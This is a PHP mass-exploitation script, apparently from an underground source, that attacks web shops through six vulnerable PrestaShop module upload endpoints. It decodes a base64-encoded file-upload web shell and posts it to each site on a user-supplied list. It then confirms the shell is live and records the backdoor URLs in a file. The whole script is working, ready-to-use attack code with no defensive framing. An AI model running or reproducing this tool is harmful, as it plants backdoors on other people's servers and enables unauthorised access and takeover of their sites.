<?php
// dont change rights retard
// usage : php *.php list.txt
error_reporting(0);
set_time_limit(0);

if(!file_exists($argv[1])){
  die('List Sites Not Found');
}
$get=file_get_contents($argv[1]);
$ex=explode("\n",$get);
$azouz=file($argv[1]);
date_default_timezone_set('Tunisia');
$date = date('m/d/Y h:i:s a', time());
echo"
######  ######  #######  #####  #######    #     #####  #     # ####### ######  
#     # #     # #       #     #    #      # #   #     # #     # #     # #     # 
#     # #     # #       #          #     #   #  #       #     # #     # #     # 
######  ######  #####    #####     #    #     #  #####  ####### #     # ######  
#       #   #   #             #    #    #######       # #     # #     # #       
#       #    #  #       #     #    #    #     # #     # #     # #     # #       
#       #     # #######  #####     #    #     #  #####  #     # ####### #       
########################    6 Modules Exploiter     ###########################
########################     Author : AnonJoker     ###########################
########################  Usage:php *.php list.txt  ###########################
\n
";
echo "   Started in : ".$date;
echo"\n   I will scan ".count($azouz)." website\n\n";



foreach($azouz as $sites){
	// Self backdoor creator
	$azouz = 'a2lsbGVyDQo8P3BocCANCiRmaWxlbmFtZSA9ICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddOw0KJGZpbGV0bXAgID0gJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddOw0KIA0KZWNobyAiPGZvcm0gbWV0aG9kPSdQT1NUJyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz4NCiAgICAgICAgPGlucHV0IHR5cGU9J2ZpbGUnbmFtZT0nZmlsZScgLz4NCiAgICAgICAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J2dvJyAvPg0KPC9mb3JtPiI7DQogDQppZihtb3ZlX3VwbG9hZGVkX2ZpbGUoJGZpbGV0bXAsJGZpbGVuYW1lKT09JzEnKXsNCmVjaG8gJzxiPicuJGZpbGVuYW1lOw0KfQ0KPz4=';

$file = fopen("b.php" ,"w+");
$write = fwrite ($file ,base64_decode($azouz));

   echo " \nScaning > $sites";
   $sites=trim($sites);
   //////////// modules classes
    echo "\n\n       Testing Simpleslideshow";
   $uploadfile="b.php";
   $url = "/modules/simpleslideshow/uploadimage.php";
   $url2 = "/modules/simpleslideshow/slides/b.php";
   $ch = curl_init("$sites.$url");
   curl_setopt($ch, CURLOPT_POST, true);
   curl_setopt($ch, CURLOPT_POSTFIELDS, array('userfile'=>"@$uploadfile"));
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$postResult = curl_exec($ch);
   curl_close($ch);
 $get1=@file_get_contents($sites.$url2);
	if(preg_match('#killer#',$get1)){
	echo "\n\t $sites$url2";
	$f = fopen("Shells.htm","a+");
		fwrite ($f,$sites.$url2."<br>");
        fclose($f);
		} else { 
		echo "\n\t Fail "; 
   
} 
  ////////////
    echo "\n       Testing Productpageadverts";
   $uploadfile2="b.php";
   $url3 = "/modules/productpageadverts/uploadimage.php";
   $url24 = "/modules/productpageadverts/slides/b.php";
   $ch = curl_init("$sites.$url3");
   curl_setopt($ch, CURLOPT_POST, true);
   curl_setopt($ch, CURLOPT_POSTFIELDS, array('userfile'=>"@$uploadfile2"));
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   	$postResult = curl_exec($ch);
   	curl_close($ch);
 $get12=@file_get_contents($sites.$url24);
	if(preg_match('#killer#',$get12)){
	echo "\n\t $sites$url24";
	$f = fopen("Shells.htm","a+");
		fwrite ($f,$sites.$url24."<br>");
        fclose($f);
		} else { 
		echo "\n\t Fail"; 
   
} 
   ////////////
    echo "\n       Testing Columnadverts";
   $uploadfile23="b.php";
   $url34 = "/modules/columnadverts/uploadimage.php";
   $url245 = "/modules/columnadverts/slides/b.php";
   $ch = curl_init("$sites.$url34");
   curl_setopt($ch, CURLOPT_POST, true);
   curl_setopt($ch, CURLOPT_POSTFIELDS, array('userfile'=>"@$uploadfile23"));
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   	$postResult = curl_exec($ch);
   	curl_close($ch);
 $get123=@file_get_contents($sites.$url245);
	if(preg_match('#killer#',$get123)){
	echo "\n\t $sites$url245";
	$f = fopen("Shells.htm","a+");
		fwrite ($f,$sites.$url245."<br>");
        fclose($f);
		} else { 
		echo "\n\t Fail";   
}
  ////////////
      echo "\n       Testing Homepageadvertise";
   $uploadfile234="b.php";
   $url345 = "/modules/homepageadvertise/uploadimage.php";
   $url2456 = "/modules/homepageadvertise/slides/b.php";
   $ch = curl_init("$sites.$url345");
   curl_setopt($ch, CURLOPT_POST, true);
   curl_setopt($ch, CURLOPT_POSTFIELDS, array('userfile'=>"@$uploadfile234"));
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   	$postResult = curl_exec($ch);
   	curl_close($ch);
 $get124=@file_get_contents($sites.$url2456);
	if(preg_match('#killer#',$get124)){
	echo "\n\t $sites$url2456";
		$f = fopen("Shells.htm","a+");
		fwrite ($f,$sites.$url2456."<br>");
        fclose($f);
		} else { 
		echo "\n\t Fail";   
}
  //////////
      echo "\n       Testing Attributewizardpro";
   $uploadfile2345="b.php";
   $url3456 = "/modules/attributewizardpro/file_upload.php";
   $url24567 = "/modules/attributewizardpro/file_uploads/b.php";
   $ch = curl_init("$sites.$url3456");
   curl_setopt($ch, CURLOPT_POST, true);
   curl_setopt($ch, CURLOPT_POSTFIELDS, array('userfile'=>"@$uploadfile2345"));
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   	$postResult = curl_exec($ch);
   	curl_close($ch);
 $get125=@file_get_contents($sites.$url24567);
	if(preg_match('#killer#',$get125)){
	echo "\n\t $sites$url24567";
		$f = fopen("Shells.htm","a+");
		fwrite ($f,$sites.$url24567."<br>");
        fclose($f);
		} else { 
		echo "\n\t Fail";   
}
 ///////////
     echo "\n       Testing Vtemslideshow";
   $uploadfile2349="b.php";
   $url3450 = "/modules/vtemslideshow/uploadimage.php";
   $url24560 = "/modules/vtemslideshow/slides/b.php";
   $ch = curl_init("$sites.$url3450");
   curl_setopt($ch, CURLOPT_POST, true);
   curl_setopt($ch, CURLOPT_POSTFIELDS, array('userfile'=>"@$uploadfile2349"));
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   	$postResult = curl_exec($ch);
   	curl_close($ch);
 $get1276=@file_get_contents($sites.$url24560);
	if(preg_match('#killer#',$get1276)){
	echo "\n\t $sites$url24560";
			$f = fopen("Shells.htm","a+");
		fwrite ($f,$sites.$url24560."<br>");
        fclose($f);
		} else { 
		echo "\n\t Fail \n";   
} }
 //Finished by anonjoker
?>